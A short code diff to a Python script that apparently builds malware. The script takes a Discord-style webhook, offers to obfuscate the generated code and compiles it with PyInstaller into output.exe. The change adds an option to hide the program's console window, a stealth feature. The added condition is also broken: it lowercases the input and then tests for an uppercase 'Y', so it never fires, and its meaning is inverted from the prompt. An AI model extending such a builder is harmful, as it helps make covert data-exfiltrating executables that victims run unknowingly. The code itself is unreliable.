@@ -18,6 +18,7 @@ os.system("cls")
 
 webhook = input("Paste your Webhook: ")
 obfuscate = input("Obfuscate (Encrypt) the code? (Y/N): ")
+console = input("Show the Console when running? (Y/N): ")
 
 id = base64.b64encode(os.urandom(16)).decode().replace("=","").replace("/","")
 
@@ -197,7 +198,7 @@ try:
 
     open(f"tmp_{id}.py", "w").write(newcode)
 
-    os.system(f"pyinstaller --clean --onefile tmp_{id}.py")
+    os.system(f"pyinstaller --clean {'--noconsole ' if console.lower().startswith('Y') else ''}--onefile tmp_{id}.py")
 
     shutil.copy2(f"dist\\tmp_{id}.exe", "output.exe")
     shutil.rmtree("dist")
